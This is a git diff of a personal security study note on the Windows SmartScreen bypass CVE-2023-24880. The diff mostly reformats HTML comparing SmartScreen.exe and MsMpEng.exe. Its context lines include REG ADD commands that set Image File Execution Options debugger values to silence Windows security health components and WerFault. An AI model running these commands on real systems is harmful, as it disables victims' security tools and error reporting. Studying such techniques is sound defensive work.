@@ -22,13 +22,13 @@ CVE-2023-24880 (CVSS score: 5.4), is a security feature bypass found in Windows 
 <strong>SmartScreen.exe</strong> : Protects the computer from malicious code or threats by checking the safety of files or executable files downloaded by the user.<br>
 
 <h3>Difference</h3>
-1. To do :<br>
--Smartscreen.exe is primarily responsible for evaluating the reliability of downloaded files and blocking malicious code. 
--MsMpenge.exe is reponsible for Windows Defender's core role of detecting and blocking malware. MsMpenge.exe scans your computer's files and system health to identify and remove malicious code.
-
-2.  Scope of role :<br>
--SmartScreen.exe is primarily focused on evaluating the reliability of files downloaded from the Internet.
--MsMpenge.exe protects your entire system, detects malware, and provides real-time protection for files, folder, executables, and more.
+<p>1. To do :</p>
+-Smartscreen.exe is primarily responsible for evaluating the reliability of downloaded files and blocking malicious code.<br>
+-MsMpenge.exe is reponsible for Windows Defender's core role of detecting and blocking malware. MsMpenge.exe scans your computer's files and system health to identify and remove malicious code.<br>
+<br>
+<p>2. Scope of role :</p>
+-SmartScreen.exe is primarily focused on evaluating the reliability of files downloaded from the Internet.<br>
+-MsMpenge.exe protects your entire system, detects malware, and provides real-time protection for files, folder, executables, and more.<br>
 
 ![image](https://github.com/Kwhitebear/Security_study/assets/99308681/607f800e-d432-445b-bb68-98deca7b6293)
 
@@ -42,3 +42,7 @@ REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution 
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\securityhealthhost.exe" /v Debugger /d "cmd.exe /C >null: 2>null:"<br>
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\secHealthUI.exe" /v Debugger /d "cmd.exe /C >null: 2>null:"<br>
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\werFault.exe" /v Debugger /d "cmd.exe /C >null: 2>null:"<br>
+
+![image](https://github.com/Kwhitebear/Security_study/assets/99308681/03c52498-451b-4df5-9222-526db34b7964)
+
+Run system32
